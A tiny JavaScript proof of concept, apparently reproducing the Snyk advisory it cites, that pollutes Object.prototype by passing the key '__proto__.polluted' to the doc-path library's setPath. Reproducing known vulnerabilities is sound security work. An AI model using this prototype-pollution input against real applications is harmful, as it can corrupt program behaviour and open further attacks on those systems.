//https://snyk.io/vuln/SNYK-JS-DOCPATH-1011952
 
  const path = require("doc-path");
  let obj = {};

   

  path.setPath({}, "__proto__.polluted", "yes");
// End of file
